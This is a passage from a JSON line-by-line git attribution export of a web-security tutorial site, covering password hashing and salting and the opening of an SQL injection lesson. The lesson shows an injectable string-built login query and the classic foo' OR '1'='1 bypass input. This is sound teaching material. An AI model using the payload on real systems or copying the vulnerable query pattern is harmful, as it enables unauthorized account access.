        "content": "Another encryption method is the _Pigpen Cipher_, where letters are \u003ctooltip content\u003d\"Substitution is a common technique in encrypting data by converting all instances of one letter to something else\"\u003esubstituted\u003c/tooltip\u003e with symbols. The encryption key usually looks something like this:"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "![Pigpen Cipher diagram](passwordStorage/pigpen.png \"The Pigpen cipher substitution\") "
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "In this case, each letter is substituted with a symbol that matches the exterior walls of where that letter is. For example, the letter `W` would be encrypted to the symbol ![W](passwordStorage/W.png \"Pigpen cipher substitution for W\") . If the letter is located on the right side instead, then a dot is placed in the middle of the symbol to indicate that it refers to the right letter instead of the one on the left. For example, the letter P would be encrypted to the symbol ![P](passwordStorage/P.png \"Pigpen cipher substitution for P\")"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "Naturally, the decryption key would be the encryption key itself, as it can be re-used to decrypt the ciphertext. Compared to the Caesar cipher, The Pigpen cipher is more resilient to brute force attacks if one doesn\u0027t know the decryption key, as it could result in one trying all possible substitution for each symbol. "
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "I had a secret agent send me information about the secret ingredient of Mick\u0027s cheeseburgers earlier, as they were delicious and I found myself constantly eating it. I suspect it\u0027s some addictive substance to make customers keep coming back for more. To ensure that Mick didn\u0027t know their secret ingredient was being leaked, I had my agent send it in Pigpen cipher:"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "![Cheese](passwordStorage/cheese.png \"Secret ingredient of Mick\u0027s cheeseburgers\") "
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "Encryption might seem like a good idea because the ciphertext is meaningless without the decryption key, which prevents all of the problems with storing the data directly in plaintext. However, because encryption is \u003ctooltip content\u003d\"If a function is reversible, and it converts from x to y, then it can also convert from y back to x\"\u003e reversible\u003c/tooltip\u003e, it is always possible to regain the original password from the ciphertext. Since the password is encrypted, the decryption key must also be stored somewhere. This means that if someone manages to hack into the application and read the encrypted passwords, it is also likely that they will be able to read the decryption key. With the decryption key, they will be able to decrypt all the passwords and read them anyway. This makes encryption unsuitable for password storage."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpopover id\u003d\"pop:encrypt-key\" title\u003d\"All encryption algorithms require an _encryption key_\" placement\u003d\"top\"\u003e"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv slot\u003d\"content\"\u003e"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "The key is usually randomly generated text that is used to encrypt the original data."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003c/div\u003e"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "## Hashing"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "_Hashing_ is a \u003ctooltip content\u003d\"A one way function is a function that is easy to compute the result of, but whose results are difficult to reverse back to the original input\"\u003eone-way\u003c/tooltip\u003e function that transforms a set of data into another set of data. Unlike encryption, when hashing is done, information that describes the original set of data is lost irrevocably in the process. This means that it is impossible to recover the original input from the \u003ctooltip content\u003d\"A hash is the output of a hashing algorithm\"\u003ehash."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpopover id\u003d\"pop:hashing-algo\" title\u003d\"A _hashing algorithm_ is a specific type of operation that hashes the input\" placement\u003d\"top\"\u003e"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv slot\u003d\"content\"\u003e"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "Different types of hashing algorithms will result in different output."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003c/div\u003e"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "Some examples of cryptographic \u003ctrigger for\u003d\"pop:hashing-algo\"\u003ehashing algorithms\u003c/trigger\u003e are [MD5](https://www.quora.com/How-does-the-MD5-algorithm-work) and [SHA1](https://deadhacker.com/2006/02/21/sha-1-illustrated/). However, when you perform hashing for passwords, you should use password hashing algorithms (such as [Argon2](https://github.com/P-H-C/phc-winner-argon2), [SCrypt](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.scrypt.html) and [bcrypt](https://security.stackexchange.com/questions/4781/do-any-security-experts-recommend-bcrypt-for-password-storage)). The main difference between these are that password hashing algorithms are designed to be slow to prevent brute force attacks, unlike cryptographic hashing algorithms which are built for speed. Despite that, if you plan on learning more about hashing algorithms, we recommend starting with MD5 and SHA1, as they are easier algorithms to learn about."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "For example, a simple hashing algorithm that acts on numbers could add up all the digits in that number. This would mean hashing the number `1013` would result in 1+0+1+3 \u003d `5`. Hashing the number `761` would result in `14`. Note that after hashing the number, there is no way to regain back the original number - data about the original number (such as number and position of digits) have been irrevocably lost in the process. Additionally, many different numbers could result in the same hash. For example, the numbers `101` and `20` both result in the hash of `2`. This is called a _hash collision_. A good hashing algorithm attempts to minimize the amount of hash collisions such that the probability of it happening is close to 0. In the case of the MD5 algorithm, the probability of a hash collision given any two inputs is 1 in 2\u003csup\u003e128\u003c/sup\u003e which is 1 in 340,282,366,920,938,463,463,374,607,431,768,211,456."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Why Isn\u0027t Hashing Enough?"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "A _[rainbow table](https://en.wikipedia.org/wiki/Rainbow_table)_ is a precomputed table of hashes for some set of passwords. Basically, people build huge tables of hashes wherein the plaintext is already known, so that attempting to crack hashes becomes a simple problem of looking up the hash in the table and its corresponding value, instead of attempting to reverse the hash. Through this method, it is very easy to crack simple hashes by simply doing a lookup."
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "An example of a service that provides this is [Crackstation](https://crackstation.net/)."
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "Since attacks like rainbow tables exist, passwords need another layer of security."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "## Salting"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "_Salting_ refers to appending a string of text, unique to each user, to their password before hashing them. Since each user has a unique salt, this makes rainbow tables ineffective, as the majority of the precomputed hashes won\u0027t even contain the salt, so they wouldn\u0027t even matter anyway! In this way, the salt forces the attacker to recompute the rainbow table for each password in order to be able to effectively use it. This effectively converts the attack to brute force, as each hash must be recomputed for each possible password. Additionally, the computed rainbow table would only be useful for that specific user, as each user would have a different salt. It could take years before a password is cracked!"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "Note that the salt should be randomly generated, as opposed to choosing a static value that is different for every user. For example, if an application used the username of the user as the salt, then attackers can pre-generate rainbow tables for common usernames, causing users with common username to be vulnerable to a rainbow table attack, even with salt applied to their passwords."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "Thus, the way to store passwords properly is to use a _salted hash_ - take the user\u0027s password, append some data to it, and hash the result. That hash is the user\u0027s hashed password. When the user attempts to log in again, perform the same procedure again. If the hash matches, then you know that the user is who he says he is, even if you don\u0027t actually know the original password that the user provided. "
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "One question that is commonly asked by developers is where to store the salt. The salt can be stored in plaintext, along with the user in the database. Since the goal of the salt is only to prevent precomputed rainbow tables from being used, it doesn\u0027t need to be encrypted in the database."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "Many good password hashing algorithms today have built-in salts, such as [Argon2](https://github.com/P-H-C/phc-winner-argon2), [SCrypt](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.scrypt.html) and [bcrypt](https://security.stackexchange.com/questions/4781/do-any-security-experts-recommend-bcrypt-for-password-storage). A good password hashing algorithm or library will salt automatically."
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### What if There Is a Server Breach?"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "A common question asked by developers is how much all of these security measures actually matter. After all, if an attacker has gained access to the entire application, does it matter if passwords are stored in plaintext or not?"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "If an attacker has already gained access to the entire application, then he already has all the information that he could possibly want from the server. He would have access to all of the application\u0027s data, including data from users or from any analytics software that might be running. However, by adding salt and hashing passwords, the attacker still doesn\u0027t know customer\u0027s passwords and could take years to find out. Otherwise, since 59% of people use the same password across multiple sites \u003csup\u003e[source](https://securityboulevard.com/2018/05/59-of-people-use-the-same-password-everywhere-poll-finds/)\u003c/sup\u003e, the attacker could quickly try other websites such as banks to attempt to break into those accounts, which can potentially yield great returns in terms of information and/or money."
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "Additionally, when a user signed up on your website and provided you a password, they implicitly trusted you to keep that information safe and secure for them. In a sense, you do have a responsibility to keep their passwords secure. By doing proper password storage, if your servers ever get breached, you can assure your customers that their passwords are properly secured, and still maintain some of their trust in you."
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Getting Started"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"danger\"\u003e"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "It is far too easy to screw up and make a mistake. Instead, use one of the free libraries that provide a crypto function that has already been well-tested by the community. \u003cb\u003eDo not write your own crypto library.\u003c/b\u003e"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some libraries you can use to implement password storage:"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "* PHP: [password_hash](https://secure.php.net/manual/en/function.password-hash.php)"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "* Java: [SecretKeyFactory](https://www.owasp.org/index.php/Hashing_Java) "
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "* Python: [PassLib](https://passlib.readthedocs.io/en/stable/narr/hash-tutorial.html)"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "* JavaScript: [bcrypt](https://www.npmjs.com/package/bcrypt)"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Other Resources"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "* [Secure Salted Password Hashing - How to do it properly](https://crackstation.net/hashing-security.htm) is an excellent resource that explains how to perform salted password hashing correctly, including links to other good libraries and what else can be done."
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "* [Awesome Cryptography](https://github.com/sobolevn/awesome-cryptography) is a curated list of resources on cryptographic algorithms - articles, blogs, books, libraries and more."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "iskandarzulkarnaien": 12,
      "-": 141
    }
  },
  {
    "path": "contents/security/sqlInjection.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: SQL Injection"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# SQL Injection"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Authors: [Jiang Chunhui](https://github.com/Adoby7), [Lewis Koh](https://github.com/nus-cs3281/2018/blob/master/students/lewisKoh/lewisKoh-Resume.md)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Chattoraj Ayush](https://github.com/AyushChatto), [Monika Manuela Hengki](https://github.com/monmanuela),  [Nicholas Chua](https://github.com/nicholaschuayunzhi), [Rachael Sim](https://github.com/rachx), [Tran Tien Dat](https://github.com/tran-tien-dat), [Wen Xin](https://github.com/wenmogu)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [SQL‎](#sql)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How does SQL Injection Work?‎](#how-does-sql-injection-work)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why is it Important to Prevent SQL Injection?‎](#why-is-it-important-to-prevent-sql-injection)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Preventing SQL Injection‎](#preventing-sql-injection)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Solution 1: Prepared Statements using Parameterized Queries‎](#solution-1-prepared-statements-using-parameterized-queries)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Solution 2: Whitelist Input Validation‎](#solution-2-whitelist-input-validation)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Resources‎](#resources)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "## SQL"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "SQL (Structured Query Language) is a common language which is used by websites to communicate with databases. Databases can be used to store persistent data, such as usernames and passwords, sensitive account data, or other important information used by the website. Typically, SQL works on relational databases, which are usually made of many \"tables\" organised in rows and columns. Each row is a separate entry in the table, and each column is a specific parameter which can be used by the entry. A sample table is shown below:"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "|   UserId   |    Username   |Password|"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "|:----------:|:-------------:|:------:|"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "|      1     |     Admin     | 123456 |"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "|      2     |     Alice     | pw1234 |"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "|      3     |      ...      |   ...  |"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "SQL is used to interact with the database by sending \"queries\" which the database responds to. Some common SQL commands used include: "
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "* `SELECT` - retrieves information from a table"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "* `UPDATE` - changes information from a table"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "* `INSERT INTO` - adds a new entry into a table"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "* `DELETE FROM` - deletes information from a table"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "* `DROP` - deletes the whole table"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "In addition, a query could use parameters to filter, reorder, and group the returned results. For example, the following query will only returns the records in table \"users\" whose user name is \"Admin\". Here the parameter `Username \u003d Admin` in the `WHERE clause` works as a filter."
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "```SQL"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "SELECT * FROM users WHERE Username \u003d \u0027Admin\u0027"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "More information about SQL can be found [here](https://www.w3schools.com/sql/)."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How Does SQL Injection Work?"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e**SQL injection is the placement of malicious code in SQL statements, via web page input.**\u003cbr\u003e--source: [w3schools](https://www.w3schools.com/sql/sql_injection.asp)"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "To learn about SQL injection, let us suppose that a typical website connects to a database which stores user information like below:"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "|   UserId   |    Username   |Password|"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "|:----------:|:-------------:|:------:|"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "|      1     |     Admin     | 123456 |"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "|      2     |     Alice     | pw1234 |"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "|      3     |      ...      |   ...  |"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "Then the website prompts a login form to require the user to enter `username` and `password`. After receiving the data, it generates the following SQL query: "
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "String query \u003d \"SELECT * FROM Users WHERE Username \u003d ‘\" + input_username +\"’ "
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "                AND Password \u003d ‘\" + input_password + \"’\";"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": " Next, the website checks whether the query returns any record to verify whether the user enters the correct password."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "As an example, if a user entered their username, `Alice`, and password, `pw1234` into the website to try to gain access:"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "Username: Alice"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "Password: pw1234"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "The constructed query would look like this:"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "SELECT * FROM Users WHERE Username \u003d ‘Alice’ "
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "AND Password \u003d ‘pw1234’"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "This query would find all entries in the `Users` table in the database, and return any entries where the `Username` is `Alice` and the `Password` is `pw1234`. If the previous table was searched, it would return the details of the second row as the result. Since there was a result returned, the website would be able to tell that a legitimate username and password combination was entered since the query requires that both are matched to retrieve the data. Thus, the website would know that the user is legitimate, and the user would be allowed to log into the site."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": " On the other hand, if no result was returned by the database, the website would know that the username and password combination does not match any of the users in the database, and would deny access to the person trying to log in."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "**However, some websites may not check the syntax of user input rigorously, and therefore a malicious user can inject SQL query via the user input.** "
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "In the example above, the website directly substitutes the information given by the user without any validation. In this case, an attacker can supply some malicious SQL code in the user input such that it changes the nature of the SQL statement executed."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": " For example, the attacker can add more parameters to the query:"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "Username: Admin"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "Password: foo’ OR ‘1’\u003d‘1"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "The SQL command string built from this input would be as follows:"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "SELECT * FROM Users WHERE Username \u003d ‘Admin’ "
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "AND Password \u003d ‘foo’ OR ‘1’\u003d‘1’"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "In SQL, `AND` operations are checked before `OR` operations."
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "This query will check the database for entries where:"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "(Username \u003d Admin AND Password \u003d foo) OR (‘1’\u003d‘1’)"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "This `where` clause will always return true, as `‘1’\u003d‘1’` is always true."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "As such, the query can be simplified to this:"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 122,
        "author": {
